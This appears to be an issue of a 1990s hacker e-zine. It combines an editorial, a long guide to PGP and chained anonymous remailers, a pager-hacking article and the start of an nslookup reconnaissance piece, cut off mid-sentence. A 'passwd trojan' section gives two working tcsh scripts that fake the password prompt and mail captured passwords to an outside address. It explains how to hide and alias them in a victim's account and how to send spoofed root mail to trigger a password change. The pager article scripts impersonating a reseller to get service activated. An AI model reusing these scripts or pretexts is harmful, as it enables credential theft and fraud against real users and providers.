                               ____________

Well, Here is issue 2.  A bit fatter, and hopefully a bit better than issue
1 was. We have a bit of a variety this month.

I wrote a file which will hopefully educate more people on the why's and how's
of encryption where it relates to mail.

Major shares information on pagers, and hacking pager service.

Panther Modern takes a deeper look into nslookup, with an excellent followup
article to the How To Find Domains article from issue 1.

Terminal presents a new trojan and ideas on how to install/use it.

A System ID file with defaults listed is also included. Compiled by various
members of TYM. This list will be constantly updated and released on it's own
so please feel free to send items to be added. systems, defaults, etc..



Submissions for this magazine are accepted from anyone who has the desire to
write an interesting article, and also has the ability to do so. We are actively
seeking out quality writers, so don't be shy.

Send your submissions, comments, suggestions, etc... to:

Editorial: The State of the "Scene" as I see it.


  Correct me if I am wrong, but those of you who have been around for a while
may have noticed (and correctly at that) that the h/p scene in general is
degenerating. It has been a few years since I have seen a collective of people
sharing and helping each other out as a whole. I now see a bunch of tired old
has-been's taunting the never-will-be's, people who "might-have-been" being
totally turned off by the way they were treated upon entering the "scene".

  The time is NOW to stop this moronic bullshit from all sides and get with
the program. The "Computer Underground" community could be a powerful force
to whatever ends, if it weren't continuously ripping itself into pieces. All
it takes is a little paying attention, a little more tolerance, and a little
more common decency.


Here are my suggestions to this end:

To those of you who have the knowledge,
but are lacking in the social skills dept:

Be nice to a lamer. You may not know what good could come of it. I do. I have
always been quite helpful to people new to the scene, and it has rewarded me
in learning new things from them. And most of the helping I've done isn't
anything that required a great devotion of time. Usually a pointer to a book,
or tfile is enough, and the people that are worth the while will take it from
there.

To those of you who are new:

Lurk!

That is the single biggest problem that people new to the scene do. They start
running off at the mouth, and anyone who may have been of help to them turns
on the auto-idiot-filters and tunes them out. Listen to what people say, watch
what they are doing, read, read, read. Most of all, ask questions only when
you have exhausted your own sources of information. In other words learn what
you can on your own, don't beg other people for easily obtained information.
Hunt it down yourself and you might get an even better deal that you had hoped
for. Pester people and you will probably be flamed into non-existence.

Most of all, I think some people need a brief refresher on what hacking is all
about.

It is not about getting root, destroying information, crashing BBS's, getting
the latest unix exploit, posing on IRC, or espionage. Though I suppose it could
be used for these ends.

It is about: LEARNING, EXPLORING, and LIBERATING.

As the title of this magazine suggests, it *IS* Time For a Change. It is time
to get back to the basics and remember what this is all about. It is time to
join together as brothers instead of breaking up into small non-communicating
parts. It is time to go and search for new things, time to quit becoming fully
like the totalitarian institutions that we supposedly despise. It is time to
throw a big fuck you at our deaf and blind government. It is time to move
forward instead of stagnating. It is time to evolve.

It is TIME FOR A CHANGE.

Peace.

INTRODUCTION -

This file is aimed at the the crypto-novices from all walks of life. Whether
it be the wiley sysadmin wanting to protect crucial system information, the
ueberhacker wanting to keep his activities secret, or joe blow from anyplace
USA that wants to make sure his private life remains private.

The main reason that I am writing this file is that many people I communicate 
with refuse to use encryption, or do use it, but very grudgingly. I want all
of my communications to be secure, and so should you. This file will make an
attempt to explain why YOU need encryption, and some means of obtaining and
using it.



Why should I use encryption?

Let me just say that the world is an insecure place, and the net is even more
so.  Everything you do or say can be logged, recorded, and/or in some way
monitored. I am not going to try to tell you how to gain personal privacy in
the real world (perhaps the next file.<grin>), but how to gain at least an
acceptable level of privacy electronically.

Let's start with an example that most people can relate to: Email.

You have an account on netcom.com, you want to send mail to someone at
nyx.cs.du.edu. Sounds pretty simple eh? Well, the following is a log from
traceroute on just exactly where your packets are going.

That is 18 stops on the way to it's destination. Any of which could/can
intercept your mail.  Nevermind the destination, where it will sit for an
indefinite period of time.

Let me make one thing very clear. System Administrators and Hackers, and
perhaps other people CAN and DO read private mail on the systems where they
have the ability to do so.

There are lots of reasons for this. Sysadmins sometimes do it to search for
signs of system intrusion, for other "legitimate" reasons, or simply because
they are bored, nosey and can.  Hackers also do it for many reasons, to look 
for possible holes/passwords/etc to exploit, to get information about a
certain person, to make sure the sysadmin is not on to them, and also
because they are bored, nosey, and can.


The next obvious step for some people (apparently a LOT of people) is to
take a small step in securing anonymity.  Using an anonymous remailer.

A very popular remailer is located at anon.penet.fi. The way it works is you
send mail to it, it sends you back an id in the format of anXXXXXX where
XXXXXXX is a 6 digit number based somehow on your host/user-name. Each
person gets a unique ID and is able to send mail "anonymously" by addressing
the message to anon@anon.penet.fi and putting X-Anon-To: guy@foo.bar in
either the header or body of the message. It also has password capabilities
which are required to use the anon account to post to usenet newsgroups.

This seems to be secure enough for some people, but in reality, it's no more
secure than sending mail directly. The only difference is, on the last leg
of the trip it no longer contains your email address. One problem stems from
the fact that penet ALWAYS has you address, and in order to compromise ANY
"anon" communications through there, you only need to capture one system.

Also, there is the matter of before and after. If you send sensitive
material (I'll leave it to you to define sensitive) via email, you have your
account, and someone elses attached to it. Anon remailing takes only one of
those factors out. Depending on which side of penet your mail happens to be
on, that may not even be the case. On it's way to penet, and until it is
processed (chewed up and spat out a lot of the time) the mail contains your
address, the recipients address, AND your anon password in plaintext. Some
user end mail programs save sent mail automatically, thereby totally
defeating the purpose of sending anon mail. Even if you mail program doesn't
save your mail, and you are extra careful about it, take a look at where it
goes before it hits penet.

11 Systems besides your own and anon.penet itself are having your mail
passed through. That's not to mention any local machines your system might
route it's mail through.

All of those systems are seeing the "before" aspect of your "anonymous"
mail. Any one of them could intercept it.

You may ask: Why would anyone want to intercept my mail?
That's not really the point, if someone is intercepting mail on a gateway,
and happens to get yours, they might read it. Even a minuscule chance of
mail interception is far too great a chance in my mind.

If that is not enough, there have been dozens of rumors of penet being
compromised, which makes it just a long out-of-the way semi-conspicuous
trip to the same place.

(Note: Since the original draft of this document, Julf's remailer at penet
was raided by finnish police (as well as his home) and he was forced to give
up some information regarding a person who used the remailer for "illegal"
purposes. Penet is through, use it only as a fond memory of an early remailer.
You are completely relieving yourself of privacy if you use this remailer.)


Consider, however, an encrypted mail message. It cannot be read locally,
because it is encrypted, it cannot be read by any possible interceptors
for the same reason. If you use encryption AND a double blind anon service
like penet, you are moving in the right direction. An even better move would
be to use encryption, cypherpunk remailers (which will be covered later in
this text) and throw penet or a similar service somewhere in the middle of
the whole mess. Then you have as close to secure communication as you can
get on a gigantic global network.

There are still ways that these messages can be intercepted, followed,
traced, and so forth, but these methods are quite difficult to accomplish,
and are well beyond the scope of this document.



METHODS -

       -PGP-

The first thing you will want to do is pick up a copy of PGP 2.6 or higher.
Due to legal reasons, PGP is no longer compatible with versions lower than
2.5. You can still read messages from people using 2.3- but they cannot read
yours. If you are currently using a version less than or equal to 2.3a,
upgrade. You aren't doing anything but inconveniencing yourself.

If you are having trouble finding pgp, ftp to:

ftp.csua.berkeley.edu         directory:   /pub/cypherpunks

This site is the cypherpunks main ftp site. In addition to pgp, you will
find a great assortment of other interesting crypto related documents,
papers, programs, source code, etc.. It's a great site, check it out.

Once you get (and install, compile or whatever you need to do with it on
your machine) pgp, read the documentation thoroughly. Generate your own
private key, and make an ascii public key extraction. Play with it until you
get a decent feel for how the public key cryptosystem works.

	-REMAILERS-

(Including chaining faq - With my mods to make it readable)



----------------------------BEGIN INSERTED FILE--------------------------------



                            CHAINING REMAILERS HELP
                                    
Note-1: [RRT- stands for Request-Remailing-To:,
         most remailers also accept Anon-To: ]

Note-2: [You is in this doc me@mysite.home,
         substitute that address for your own if you
         want to receive the test message yourself]

Note-3: Anon-To: me@mysite.home  MUST be written exactly as shown!
        1    2  3
                3 is a Space
             2 is a Capital Letter
        1 is a Capital Letter

Note-4: All lines beginning with > are not intended to be typed/sent that
        way, they are just to mark what the messages should contain.
  __________________________________________________________________________

First you should test only one remailer:

you > remailer 1 >> RRT- you
  __________________________________________________________________________

This is what you send:

-->

> From: me@mysite.home
> To: hal@alumni.caltech.edu
>
> ::
> Request-Remailing-To: me@mysite.home
>
> Test of remailer at alumni.caltech.edu
  __________________________________________________________________________

This is what you receive from alumni.caltech.edu:

-->

> From: nobody@alumni.caltech.edu
> To: me@mysite.home
>
> Test of remailer at alumni.caltech.edu
  __________________________________________________________________________

If this is successful you add another remailer:

you > remailer 1 >> RRT- remailer 2 >>> RRT- you

This is what you send:

-->

> From: me@mysite.home
> To: hal@alumni.caltech.edu
>
> ::
> Request-Remailing-To: usura@xs4all.nl
>
> ::
> Request-Remailing-To: me@mysite.home
>
> Test of remailer at alumni.caltech.edu and RRT xs4all.nl
  __________________________________________________________________________

        Remailer usura@xs4all.nl will receive this message from
        hal@alumni.caltech.edu

-->

> From: nobody@alumni.caltech.edu
> To: usura@xs4all.nl
>
> ::
> Request-Remailing-To: me@mysite.home
>
> Test of remailer at alumni.caltech.edu and RRT xs4all.nl
  __________________________________________________________________________

    Because the message has the header pasting tokens [::]
    the remailer at xs4all.nl knows where to send it to.

        You will receive this message from xs4all.nl
-->

> From: nobody@vox.xs4all.nl
> To: me@mysite.org
>
> Test of remailer at alumni.caltech.edu and RRT xs4all.nl
  __________________________________________________________________________

You can keep adding remailers this way, every time you receive
a test message back you add another remailer: if you stop receiving
test messages, the last remailer added is most likely "down". You can
check that by using that remailer directly.

(ED Note: Some remailers that I have used take a VERY long time to remail. I
have had even direct test messages take up to 12-24 hours. In other words,
do not expect an immediate response from most remailers. A list of remailers 
and their presently clocked uptime will be included later in this file.)
  __________________________________________________________________________

The above is simple unencrypted remailing. If you want to have an
encrypted chained remailing, you first have to "design" the chain.

    0] from your PC send to alumni.caltech.edu
    1] at alumni.caltech.edu RRT jpunix.com
    2] at jpunix.com RRT vox.hacktic.nl
    3] at vox.hacktic.nl RRT me@mysite.home

{Stage 3:} This is actually the first message you make.

-->

> ::
> Request-Remailing-To: me@mysite.home
>
> Test of PGP'ed remailing trough caltech, jpunix and vox.
  __________________________________________________________________________

The above is encrypted with the PGPpubKEY of vox.hacktic.nl and will
result in this:

> -----BEGIN PGP MESSAGE-----
> Version: 2.6 for VoX Labz.
>
> hIwCWd90FI1WkT0BA/9I6ILVhl5ZpsgKgHye+ng9CokwzdW1pMgcd0ecigppAODe

> =b0bT
> -----END PGP MESSAGE-----
  __________________________________________________________________________

Then you than proceed to the 2nd stage the message which has to leave
jpunix.com, so remail@vox.hacktic.nl knows what to do [decrypt it] is:

This might seem kind of confusing to some at first glance, especially once
you start testing with encryption. But the easiest way to remember is that
it is a reverse enveloping system. the last remailer on your chain is the
one with the real destination enclosed, and therefore is the first one to
encrypt. From there it is elementary.


-- TYPES

There are several kinds of remailers. Some give you a mailing address
pseudonym and no other protection. Others give you a mailing address and
will encrypt all incoming mail for you based on a password that you supply.
Still more (the majority) provide their public key and offer to decrypt and
forward mail encrypted to it. I will attempt to cover a few of these types,
and how you can go about using them.


-- ALIASING REMAILERS

The first type I will cover is the anon service at anon.penet.fi. It seems
to be the most popular, and is also in the process of having some legal
difficulties at the moment. Please read alt.privacy.anon-server if you would
like to contribute help to their cause.


anon@anon.penet.fi -

Easiest for non-crypto types. All you need to do is send mail to
ping@anon.penet.fi to receive a double blind address (note: double blind
means that anyone who responds to you will be given an anonymous address and
your mail will appear to come from it. Keep this in mind if you had thoughts
of subscribing to high volume mailing lists through this service.). It will 
be mailed back to you automatically. It supports a password, nickname, and 
can be moved from mailing address to mailing address. It is a very good (if not
comparably secure) remailer system. For a detailed help file on everything
you could possibly want to know about it, send mail to help@anon.penet.fi.


alpha.c2.org -

Another aliasing service, but much more secure. When you use a service like
penet, they actually have your mailing address. My mailing address at
alpha.c2.org has no idea where to find me. It instead has what is called a
reply block for my return address. A reply block is just like all the
previous chaining information I went over, except all that the last part
contains is where to send the actual message to. You can also include reply
blocks in anonymous mail to people who you would like to get a response
from. Just put the block and a few other small instructions (scripts.tar.gz
on the cypherpunk ftp site contains scripts that can automate the more
painful aspects of both this and several other chaining functions.).

Here is an example reply block to a person (note: do NOT try to use this for
remailers.. they will barf on all the excess ascii garbage).

<To reply, save everything below the "cut here" marks above

<line three lines above!) and mail to hfinney@shell.portal.com

------------------------------------------------------------------

If the recipient is intelligent enough to follow these simple instructions,
they can reply to your mail without having any idea who or where you are.
The above block is kind of large, but is chained through 5 remailers, so is
reasonably secure.

The inside of this block of encryption is simply:

::
Request-Remailing-To: gitm@alpha.c2.org

Now if you were to strip away all the instructions aimed at humans from this
block, and add to the very top:

::
Request-Remailing-To: hfinney@shell.portal.com

The same block could be used as your reply block for alpha. (Note to the
dense: I don't mean that you can use this particular block for your own. I
mean, you can, if you would like me to receive all of your mail, since this
block points to my alias address at alpha <grin>).

Another nice feature of this particular remailer is that all mail sent to
your actual adress from there is also encrypted by alpha using standard pgp
encryption using your chosen password as the key. I don't consider this to
necessarily be a benefit where network monitoring is in effect, because I
don't know where or how they store the account passwords, but since the mail
you are receiving should be encrypted by the sender (hint, hint) it is an
added bonus. Also it keeps nosy local sysadmins from scanning your mail for
keywords or whatever.

From this address (like many others) you can send/receive mail and post to
usenet newsgroups. First, here is alpha's public key.

Now, to create your new mail alias, pick a nick, and create the following
message:

Reply-Block:

Now, encrypt to alpha with the -eta options on pgp, and send it off to
alias@alpha.c2.org. It would probably be a good idea to chain it through one 
or more remailers on it's way. You should receive a response within an hour 
or so acknowledging your alias. For a comprehensive help file on this 
remailer, send mail to help@alpha.c2.org.


chop.ucsd.edu -

Nearly identical in most respects to anon.penet.fi. Send mail to
acs-help@chop.ucsd.edu for an anonymous address assignment and a helpfile.


mg5n+remailer@andrew.cmu.edu -

This aliasing service is very similar to the service provided by
alpha.c2.org. The main difference I note, is that the address is a bit more
bulky. It is in the format of mg5n+alias!<nickname>@andrew.cmu.edu. kinda
long for my tastes, but they still provide an excellent service. send mail
to mg5n+remailer-help@andrew.cmu.edu for a helpfile.

Last Updated: January 24, 1995

The Cypherpunks' remailers allow you to send anonymous mail by adding the
header Request-Remailing-To: and sending to one of the addresses listed below.
Most (but not all) of these remailers also accept Anon-To: in place of
Request-Remailing-To.  These headers must be typed exactly as you see them;
most remailers are case-sensitive.  Mail without these headers is either
rejected or delivered to the remailer administrators.

If you can not add the required headers, place two colons (::) on the very
first line of your message, then on the next line type Request-Remailing-To:
and the address you want to send anonymously to.  Skip a line, and then
begin your message.  Note that by using this method it is possible to send
a message consecutively thru more than one remailer.
Be sure to place the double colons on the first line of the message, and
skip one line following the headers.  Extra blank spaces (or forgetting to
separate the headers and message) may cause problems.  Also, keep in mind
that many remailers only allow one recipient per message.

The standard cypherpunks anonymous remailers are:

hfinney@shell.portal.com
hal@alumni.caltech.edu
nowhere@bsu-cs.bsu.edu
usura@xs4all.nl
remail@c2.org
remailer@ideath.goldenbear.com
remailer@rebma.mn.org
remail@vox.xs4all.nl
remailer@desert.xs4all.nl
remailer@nately.ucsd.edu
remailer@xs4all.nl
homer@rahul.net
q@c2.org
remailer@alpha.c2.org
usura@replay.com
remailer@myriad.pc.cc.cmu.edu
syrinx@c2.org
vanklava@eniac.ac.siue.edu
remailer@tower.techwood.org

You can add additional headers to your message by placing two number signs (##)
at the beginning of the first line of the message body, and then add the
special headers on subsequent lines.  These headers are not interpreted by
the remailer software, only passed thru to the output message.  Some
remailers require that you place the Subject: header in the body of the
message, after the ## - The original subject line is removed.  See the
listings available by fingering remailer-list@kiwi.cs.berkeley.edu for
specific format information for each remailer.

remailer@soda.csua.berkeley.edu works slightly differently.  It includes
an encrypted reply block so that people can reply to your messages.  It
also requires that you use the header Anon-Send-To: to send anonymously,
and features a usenet posting service.  For more information on this
remailer, finger remailer@soda.csua.berkeley.edu, or send mail to that
address with the Subject: remailer-info

remail@extropia.wimsey.com requires that you public-key encrypt your
messages with PGP.  This added security prevents a hacker or nosey
sysadmin at your site from reading your outgoing mail or finding out
where it's going.  This remailer is not directly connected to the
internet, so messages will be delayed about an hour.  Some of the
other remailers support PGP as well.  For remailers which support
both encryption and plaintext messages, identify encrypted messages
by adding a header which reads:  Encrypted: PGP, either in the actual
message headers, or following a double colon (see examples below)
PGP keys can be found at the end of this document.

Some remailers offer several additional features.  These include
remailer@alpha.c2.org, remailer@xs4all.nl, remailer@nately.ucsd.edu
usura@replay.com and remailer@myriad.pc.cc.cmu.edu
Adding the header "Cutmarks:" will truncate the message starting with
any line that begins with the same characters as in the Cutmarks header.
This can be used to remove an automatically-inserted signature file.
Also supported is the header "Latent-Time:".  This allows a message to
be delayed at the remailer and sent out at a later time.  This is useful
because it prevents people from correlating the times at which certain
anonymous posts appear with the times that you are logged in.  Both
absolute and relative delays are possible.  For example,
"Latent-Time: 19:00" would have the remailer hold the message until
7 PM local time and then deliver it.  Times must be in 24-hour format.
"Latent-Time: +06:30" would deliver the message six hours and thirty
minutes after it is received.  The maximum permissible delay is 24
hours.  These lines may be placed either in the message headers,
or following the double colon.  For more information, send mail to
one of the remailers listed above, Subject: remailer-help

There is an anonymous contact service at anon.penet.fi.  Users are
automatically assigned an address of the form anxxxxxx@anon.penet.fi,
where xxxxxx is a number, when they first send a message via this
remailer.  Any replies to this address are forwarded back to you.
For information on this remailer, send mail to: help@anon.penet.fi

There is another anonymous contact service at chop.ucsd.edu.
For information on this remailer, send mail to: acs-info@chop.ucsd.edu

desert.xs4all.nl also has a anonymous account service.  For more information,
send mail to remail@desert.xs4all.nl with subject "help".

There is a system installed on alpha.c2.org which will allow you to
create an email address and have messages sent to that address encrypted
and sent to you.  For info on this remailer, send mail to help@alpha.c2.org.
A help file on another remailer of this type is available by sending
mail to mg5n+remailer-help@andrew.cmu.edu

If you have a www browser, A help file on a similar service is available
from http://www.c2.org/services/blind

Anonymous postings to usenet can be made by sending anonymous mail to one of
the following mail-to-usenet gateways (but the news gateways themselves do
not make the message anonymous):

group.name@news.demon.co.
group.name@bull.com
group.name@cass.ma02.bull.com
group.name@charm.magnus.acs.ohio-state.edu
group.name@comlab.ox.ac.uk
group.name@paris.ics.uci.edu
group.name@myriad.pc.cc.cmu.edu (Supports Crossposting)
group.name.usenet@canaima.Berkeley.EDU
group.name.usenet@decwrl.dec.com (Preserves all headers)

The mail-to-news gateways do not anonymize messages; you must use a
remailer if you want the message to be posted anonymously.
Not all gateways support all newsgroups.  You may have to try several
to find one that supports the groups you wish to post to.
It would also be advisable to try a post to alt.test before relying on
any such system to function as expected.  Also note that the last two
require .usenet at the end of the address.

In addition, you can cross-post to several newsgroups by adding the header
Newsgroups: with the names of the groups you want to post to and sending
it to mail2news@news.demon.co.uk or mail2news@myriad.pc.cc.cmu.edu
(Use the ## feature with the remailers to add the header line)

Examples:

Simple Remailing:
> From: joe@site.com
> To: remail@c2.org
> Subject: Anonymous Mail
>
> ::
> Anon-To: beth@univ.edu
>
> This is some anonymous mail.

Chaining remailers:

The operation of this system of remailers is a group effort which relies
on the contributions of many generous people.  Please do not abuse the
remailers.  If you have problems with a remailer, some of the remailer
operators can be contacted by sending mail to the remailer's address
without a remailing request header.  Otherwise, follow the instructions
that come in the headers of messages from the remailer.  Do not send
complaints to postmaster at the site, unless the remailer operator
specifies that as the address to make complaints.  Many of the remailers
are run by people who are not the general site administrators, and sending
to the wrong address (ie postmaster@...) will most likely just make them
annoyed at you, and won't get your problem resolved.

If you can run an anonymous remailer, please volunteer to do so.
Software is available from anonymous-FTP at
ftp.csua.berkeley.edu in the directory /pub/cypherpunks/remailer/
Additional information and source code can be found at ftp cs.cmu.edu
in the directory /afs/andrew.cmu.edu/usr12/mg5n/public/remailer
or contact me and I'll send you what you need.
The software can be run on most personal unix accounts.

There are two usenet forums for discussion of anonymous remailer systems,
alt.privacy.anon-server and alt.anonymous
The newsgroup alt.anonymous.messages is a 'mail-drop' for anonymous parties
to exchange encrypted messages.

The cypherpunks mailing list is a forum for discussing ways to promote
privacy via cryptography.  To join, send mail to cypherpunks-request@toad.com

Additional information on the anonymous remailers is available from
http://www.cs.berkeley.edu/~raph/remailer-list.html

   This is an automatically generated listing of remailers. The first
   part of the listing shows the remailers along with configuration
   options and special features for each of the remailers. The second
   part shows the 12-day history, and average latency and uptime for each
   remailer. You can also get this list by fingering
   remailer-list@kiwi.cs.berkeley.edu.

catalyst@netcom.com is _not_ a remailer.
lmccarth@ducie.cs.umass.edu is _not_ a remailer.

JPUNIX.COM offers a domain hiding service for remailers. Send email to
perry@jpunix.com for more information. NOTE: JPUNIX.COM itself does not
run a remailer. All subdomains of jpunix.com on this list are remailers
that are not physically located on jpunix.com

Use "premail -getkeys pgpkeys@kiwi.cs.berkeley.edu" to get PGP keys
for the remailers. Fingering this address works too.

-- SIGNING AND IT'S SIGNIFICANCE

What is Signing?

Signing a plaintext message is a way of letting people know that it was really
you who sent the message. That is another key feature of public key crypto-
systems.

Signing a message does a number of things. It creates an encrypted block at
the bottom of your message containing information about the message, your
public key id, etc.. Therefore the message cannot be altered and still pass
a signature check. The signature check verifies that you are who you say you
are, and that the message has not been altered since your signature.

Signing someones public key is another useful validation technique. If you
sign someone's public key, it is saying that you know that they are who they
say they are.

Needless to say, it would be quite a pain in the ass to have to encrypt,
sign, chain, etc.. everything manually, and that is one of the main reasons
I've heard a lot of people say they don't use encryption, because it's too
much of a hassle to deal with it. Well, hopefully the next section here will
cure some of those woes.



-- WAYS TO EASE THE PAIN

Well, I do realize this seems like quite a painful process, but there are a lot
of helpful tools out there to make it a bit easier to use these services.

I will also rate each program on a 4 star rating scale. This has nothing to
do with the quality of the program, but with how useful it is in real use
applications as rated by ME. If you want to form your own opinions, feel free,
get these programs!


PGPSH32A.ZIP - PGP Shell vers 3.2a. A Nice tool to automate key management,
  * * x        signing, etc. Main Drawback: No external editor support, built
               in editor sucks.(2.5 * would be 4 if it could support a real
               editor.)

PGPBLU17.ZIP - PGP Interface for Blue Wave Offline Mail Reader. Easy to use
 * * * *       signing, encrypting, etc.. All wrapped up in a nice interface.
               Easy to install, easy to use. BW2.10+ supports QWK too, so you
               can use it with your email and usenet.

CHAIN.ZIP    - Also comes in a tgz archive for unix. Automates chaining
 * * *         mail through anon remailers. You can configure it to keep your
               favorite ones handy. Comes with DOS executable and C source.
               (Note: The .tgz archive is actually a completely different
               package. It is a set of perl scripts designed to help chain
               remailers. These packages are by different authors also.)

DOSBAT.ZIP   - For unix, look for scripts.tar.z. A collection of batch files
 * * * |       (or scripts) that automates lots of things in regard to chaining
               remailers. Creates reply blocks, chains messages, etc.. A great
               package.

MEDUSA1B.ZIP - Medusa's Tentacles - Great system using a fuzzy logic algorithm
 * * * *       to strip all identifying information from a anon post/mail
               message. VERY cool.

MESS11B.ZIP  - Message Encryption and Signing System. Nice if you want to keep
   * *         your public key on whatever system you use for mail. Otherwise
               it seems a lot like the PGPBLUE interface. Not recommended
               unless you are sending mail from your local site. If you are,
               then it is an excellent substitute for PGPBLUE.

premail0.30.tar.gz - An excellent script package for preparing your mail for
  * * *        The long journey through the remailing chain.

APGP212.ZIP  - Also comes as source for unix as autopgp*.tar.gz. AutoPGP is
  * * *        a nice pre-post mail handler for QWK packets. It will search
               your packet for encrypted messages/mail, new keys, etc.. before
               you get to the mail. A nice package overall.


Also, if you really get into it, the source for remailers and such is widely
available. You can run your own quite easily.


These are but a few of MANY, MANY good programs to help streamline your
encryption needs. a couple of places to start are:

ftp.csua.berkeley.edu  /pub/cypherpunks - This is the main cypherpunk
        ftp site. You can find a lot of interesting stuff here.

ftp.dsi.unimi.it /pub/security/crypto - Here you can find a bunch of illegally
        exported crypto. Everything imaginable is probably on this site.


also:

check out the web links from http://www.csua.berkeley.edu/cypherpunks.html
All in all, the cypherpunks home page sucks, but it is a good place to find
other good crypto links.


-- IN CLOSING

I hope this file has been somewhat helpful in demonstrating the need for the
use of cryptography in your everyday communications. In researching this file,
I have learned a few extra things myself. Enjoy, and Encrypt.


Great and mighty thanks be to:


Phil Zimmermann (For being a hero for the cause of privacy!)
Matt Ghio (Author of the remailer help file)
Raph Levien (Author of the remailer information file and operator of the
             remailer pinging service (from which the file was derived))
And to the author of the chaining help file, whoever he or she may be.

------------------------------------------------------------------------------

 
 
BASICS (stuff you already know) 
------------------------------- 
 
Pagers are radio receivers, capable of decoding and displaying 
numeric, and sometimes alpha, messages.  Pagers operate in a state
of perpetual reception, and whenever the system sends a message
keyed to a particular pager, the pager responds by giving an alert
(either audible beeps, or vibration), and displays the message.

 
 
SERVICE 
-------------------------------- 
 
Pager service is cheap.  Damn cheap.  A month's worth of service
should cost less than $10.  So, there isn't much of a financial
reason to have to hack free paging service.  But... 
 
There are very few companies that provide paging service in any 
given area, yet there are multitudes of companies that sell the 
service.  These are "agents" or "resellers".  In order to activate
your pager (you do have a pager, don't you?), you will need to know
a couple of thing about it: it's capcode, and it's frequency.
Generally, both of these are printed on the pager itself (on the
back, on stickers).  The capcode consists of six-digits, but often
times letters will be scattered in as well.  Discard the letters,
keep the numbers, and you have your capcode.  The frequency will
be in a XXX.XXXX format.  Your next step will be to find out which
paging company uses the frequency in your pager in your area.  A
few phone calls will do the trick.  Simply call and ask.  It may
take a while to find someone with enough technical knowledge to
answer you, but once you find someone who knows it shouldn't be 
hard to get the information from them.  Simply tell them you have
a pager on (xxx.xxxx frequency) and want to know if it can be used
on their system.  The next step will be to find out which "agents"
sell service for the company you have targeted.  This is easy, too.
In fact, while you are on the phone asking about frequencies, you
can ask for a list of authorized agents.  The yellow pages will
also yield some results.  

Enough of the easy stuff, on to the hard part.	Social engineering
skills are essential here.  When an agent sells a pager to a
customer, they must activate the pager with the paging company. 
This is done either through a dial-up system, where the agents
enters the pager info in the paging companies computer, or over the
phone, where the agent calls the paging company, relays the
information, and the company enters the information into their 
computer.  To activate your own pager, you will need to assume the
identity of an agent, and call the paging company.  The
conversation should be fairly simple.   
"Hi, this is KewlHac from ABC Paging, I need to activate a pager."
"Sure thing!"
"Okay, the capcode is 123456." 
"Fine.  The number for that pager will be 555-6969." 
"Thanks, have a good day." 
 
Done.  If ABC paging usually activates its pagers via computer, you
might add "Sorry to bother you, but my computer is down...could you
help me out?"  A trip to ABC Paging, posing as a potential customer
should tell you if this is the case.
 
How long will it last?  Depends on how sharp ABC Paging is.  At 
worst, 555-6969 should remain valid for at least a month; at best,
who knows.  Enjoy it while you can.
 
 
HARDWARE 
-------- 
 
One word: Motorola.  This is, of course, a matter of personal preference,
but I have found Motorola products to be of the highest quality.  Also,
since Motorola pagers dominate the market, it is easier to find support
for their products.
 
The Motorola family of alpha-pagers includes The Bravo, Bravo Plus, Bravo
Express, the Encore, and the Lifestyle Series (essentially Bravos, in
redesigned cases).  Literature from pager companies will explain the
features available in these pagers, as well as pagers from other manufactures,
so I won't bother reproducing that here.
 
Most Motorola pagers are programmable via a PC interface (the exception
being the Bravo, which requires a dedicated programmer).  I have seen
some Motorola pager programming software on bbs's, but without cables
and a "pager interface box" (essentially, an rs-232 to tty converter),
the software is useless.
 
Any decent service center will have the hardware and software required
to read and program your pager.  Shop around until you find one that
is hacker-friendly, or can be social-engineered into carrying out your
wishes.  Unlike a cellular ESN, a pagers CAPCODE can easily be changed
with the programming software.	   The frequency (in a synthesized pager)
can also be changed, within a given range.  Other options, such as
timestamping (12 or 24 hour), alert-tone volume, etc., are available
for alteration via the programming software.

                                passwd trojan

                                     by

                                  Terminal

------------------------------------------------------------------------------


Here I will be presenting two scripts, (more of an idea really)... That
you may use to get passwords from people's accounts you are using via
rlogin... I am not a super script writer, and that is why I present it as
more of an idea, with an example or two...


If you get on someones account, you may want to hide this file, for this
example we will assume it is named ".hiddenf"... So you could put this
in the users home directory, and then add to the users .login an alias
for "/bin/passwd/" and "passwd", with "$HOME/.hiddenf" being run instead, so
that anytime after that, when they try to change their password, they will
really run the script... This script never erases it itself, because
then you would never get the NEW password...


---BEGIN SCRIPT ONE---
#!/bin/tcsh
echo -n "Changing password for $USER on "
hostname
echo -n "Old password: "
stty -echo
echo $<>$HOME/.tym
stty echo
echo "" 
mail me@my.anon.mail.service.org<$HOME/.tym
rm $HOME/.tym
echo
echo "Sorry."
--END SCRIPT ONE---


Now this next script is a bit different, in that it prompts for both old and
new passwords, and then gives an 'error' of "Incorrect Password"... and
erases itself... With this you would sort of have to hope the user chooses
the same "New Password" the second time it is run.. (The real passwd binary
that is)... When 'installing' this you would probably once again want to
hide it, and alias "/bin/passwd" and "passwd" to run the hidden file..


---BEGIN SCRIPT TWO---
#!/bin/tcsh
echo -n "Changing password for $USER on ";hostname
echo -n "Old password: "
stty -echo
echo $<>$HOME/.tym
echo "" 
echo -n "New password: "
echo $<>>$HOME/.tym
echo ""
stty echo
mail me@my.anon.mail.service.org<$HOME/.tym
rm $HOME/.tym
echo "Error: Incorrect Password"
rm -f $0
unalias /bin/passwd
unalias passwd
---END SCRIPT TWO---


Now you may think "Why would the user want to change his/her password
anytime soon?".. Well, to get them to change passwords you could send
fakemail 'from' their root.. saying that the password file has been tampered
with, and that they need to change passwords.. maybe even saying "please
use at least one upper case letter, and a number", or something to make
it sound real... Or if you could think of any other way to scare the user
into changing it, that would also work...


I hope this helps someone.

                        nslookup: Utility From The Gods

                               Panther Modern

------------------------------------------------------------------------------


	The nslookup utility is one that at a glance, does not show itself
to be largely useful to the hacker populous at large.  However, by exploiting
this system to it's full extent, nslookup proves invaluable.  In TFC Issue
One, Article One, Ghost in The Machine pointed out several ways to find new
domain names.  The nslookup utility will give you a method to find ALL hosts.
nslookup also allows one to find real machines within a domain, eliminating
hassle when scanning through domains looking for machine names.  All in all,
the nslookup utility is one of previously undefined wealth and value to those
who know how to correctly exploit it's virtues.

	Section 1:  A Bit About nslookup

	nslookup follows the client-server model, in that your nslookup client
will act as a gateway for you to access information contained on the server,
which in most cases will be entitled ns.domain.com, domain.com being the root
domain.  On occasion, domain.com will have several name servers, these usually
denoted by ns1.domain.com, ns2.domain.com, etc.  Also generally noted will
be domain name servers in another domain's hierarchical setup.  There are no
rules regarding naming of domain name servers.  By using a domain's given
name service, one is able to determine any information one requires about the
given domain's systems, thus enabling one to eliminate previous scanning
techniques.  Everything which the name server knows, the name server tells.
	Everything which the name server knows, your client knows.  Finally,
Everything Which The Name Server Knows, YOU Know.

	Section 2:  Finding New Domains

	nslookup is invaluable at finding new domains.  The first step in 
